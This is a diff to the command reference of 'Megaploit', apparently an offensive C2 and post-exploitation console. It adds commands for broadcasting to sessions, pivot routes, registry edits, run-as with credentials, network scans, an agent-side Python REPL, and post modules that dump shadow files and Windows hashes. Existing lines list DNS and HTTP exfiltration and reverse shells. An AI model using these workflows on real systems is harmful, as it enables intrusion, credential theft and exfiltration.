@@ -11,9 +11,14 @@ Complete reference for all commands available in the Megaploit console.
 | Command | Description |
 |---|---|
 | `sessions` | List all active sessions with ID, IP:Port, OS, hostname, username, tag, uptime |
+| `sessions -K` | Kill **all** active sessions immediately |
+| `sessions -k <id>` | Kill one session by ID |
+| `sessions -u <id>` | Upgrade session — loads meterp extensions via `load_extension megaploit.agent.meterp` |
+| `sessions -c <cmd>` | Broadcast a C2 command (not just raw shell) to **all** active sessions |
+| `sessions -s <tag>` | Filter session list by tag substring |
 | `use <session_id>` | Enter session interaction loop for session `<id>` |
 | `use <module/path>` | Load a module (e.g. `use auxiliary/scanner/tcp_port`) |
-| `broadcast <cmd>` | Run a shell command on ALL active sessions simultaneously |
+| `broadcast <cmd>` | Run a raw shell command on ALL active sessions simultaneously |
 
 ### Configuration
 
@@ -167,6 +172,17 @@ Examples:
   pipeline status
 ```
 
+### Pivot Routes
+
+```
+route add    <cidr> <session_id>   Add a route through a session (e.g. route add 10.10.0.0/16 2)
+route remove <cidr>                Remove a route
+route print                        List all routes
+route flush                        Remove all routes
+```
+
+Routes document the pivot topology and are consulted by toolbox tools and post modules.
+
 ### Operations
 
 | Command | Description |
@@ -308,8 +324,9 @@ Bundled first-party plugin for the [`C-remote-shell`](https://github.com/Levon-V
 | `chmod` | `chmod <mode> <path>` | Change permissions |
 | `cd` | `cd <dir>` | Change working directory |
 | `search` | `search <path> <keyword>` | Recursive grep |
-| `upload` | `upload <local_file>` | Push file to target |
-| `download` | `download <remote_file>` | Pull file to loot |
+| `upload` | `upload <local_file>` | Push file to target (shows size + speed) |
+| `download` | `download <remote_file>` | Pull file to loot (shows size + speed) |
+| `verify` | `verify <local_file> <remote_file>` | Compare SHA-256 both sides — confirm transfer integrity |
 | `zip_download` | `zip_download <path>` | Zip + pull |
 
 ### Process & System
@@ -427,6 +444,39 @@ Kiwi is a compiled C binary (`megaploit_kiwi.exe`) that runs on the Windows targ
 |---|---|
 | `persist <name> <file>` | Windows Run-key persistence |
 
+### Windows Registry
+
+| Command | Usage | Description |
+|---|---|---|
+| `reg query` | `reg query <HIVE\\key>` | List all values + subkeys under a key |
+| `reg get` | `reg get <HIVE\\key> <value>` | Read one registry value |
+| `reg set` | `reg set <HIVE\\key> <value> REG_SZ <data>` | Write/create a value |
+| `reg delete` | `reg delete <HIVE\\key> [value]` | Delete a value or a whole key |
+
+HIVE shortcuts: `HKLM`, `HKCU`, `HKCR`, `HKU`, `HKCC`
+REG types: `REG_SZ`, `REG_DWORD`, `REG_QWORD`, `REG_BINARY`, `REG_EXPAND_SZ`, `REG_MULTI_SZ`
+
+```
+reg query  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion
+reg get    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  MyApp
+reg set    HKCU\\Software\\Classes\\myext  (Default)  REG_SZ  "notepad.exe %1"
+reg delete HKCU\\Software\\Classes\\myext
+```
+
+### Desktop & Window Station
+
+| Command | Description |
+|---|---|
+| `getdesktop` | Return the name of the current interactive desktop (Windows `GetUserObjectInformation`) |
+| `enumdesktops` | Enumerate all desktops in the current window station (`EnumDesktopsW`) |
+
+### Process Execution
+
+| Command | Usage | Description |
+|---|---|---|
+| `execute` | `execute <exe> [args...]` | Run a binary with explicit argv (no shell) — captures stdout+stderr |
+| `run_as` | `run_as <user> <pass> <cmd>` | Run a command as a different user (`CreateProcessWithLogonW` / `sudo -u`) |
+
 ### Pivoting & Networking
 
 | Command | Description |
@@ -434,12 +484,64 @@ Kiwi is a compiled C binary (`megaploit_kiwi.exe`) that runs on the Windows targ
 | `portfwd <lport> <rhost> <rport>` | TCP relay in background thread |
 | `socks5 [port]` | RFC-1928 SOCKS5 proxy (port default 1080) |
 | `ping_sweep <cidr>` | ICMP ping sweep |
+| `arp_scan <cidr>` | Active ARP scan — scapy / arp-scan / nmap fallback (finds hosts even when ICMP is blocked) |
+| `net_view [domain]` | Domain computer / DC / share enumeration |
 | `smb_shares <host>` | SMB share enumeration |
 | `ssh_connect <host> <port> <user> <pass>` | SSH connect |
 | `rdp_enable` | Enable Remote Desktop |
 | `exfil_dns <data> <domain>` | DNS exfiltration |
 | `exfil_http <url> <file>` | HTTP exfiltration |
 | `reverse_shell <ip> <port>` | ✓ PTY reverse shell |
+
+### Background Jobs (In-Session)
+
+| Command | Usage | Description |
+|---|---|---|
+| `run_bg` | `run_bg <command>` | Submit a shell command as a background job; returns a job ID |
+| `job_result` | `job_result <job_id>` | Retrieve output of a completed background job |
+
+### Extension Management (In-Session)
+
+| Command | Usage | Description |
+|---|---|---|
+| `load_ext` | `load_ext <local.py>` | Upload a Python extension file and register its verbs on the agent in one step |
+| `load_extension` | `load_extension <path_or_module>` | Load a Python extension by path or module name already on the agent |
+| `unload_extension` | `unload_extension <name>` | Remove a previously loaded extension |
+| `list_extensions` | `list_extensions` | List all currently loaded extensions and their verbs |
+
+### Python REPL (In-Session)
+
+```
+irb
+```
+
+Drops into an interactive Python REPL running inside the agent's interpreter.
+Multi-line blocks are accumulated until a blank line is submitted.
+Type `exit` or `quit` to leave.
+
+```
+>>> import os; print(os.getcwd())
+/home/victim
+
+>>> for p in os.listdir('/'):
+...     print(p)
+
+bin
+boot
+dev
+...
+```
+
+### Post Module Runner (In-Session)
+
+```
+run post/multi/gather/sysinfo
+run post/linux/gather/dump_shadow
+run post/windows/gather/hashdump
+```
+
+Looks up the named post module in the registry and calls `mod.run(session=<current_session>)`.
+Use `show modules` to list all available post modules.
 
 ### Toolbox (In-Session)
 
